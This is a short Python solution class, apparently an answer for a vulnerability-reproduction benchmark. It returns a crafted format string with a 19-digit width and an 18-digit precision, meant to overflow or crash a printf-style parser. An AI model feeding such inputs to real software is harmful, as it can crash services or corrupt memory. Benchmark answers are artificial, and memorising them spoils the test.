class Solution:
    def solve(self, src_path: str) -> bytes:
        width = "9" * 19
        precision = "9" * 18
        payload = f"%{width}.{precision}d"
        return payload.encode("ascii")
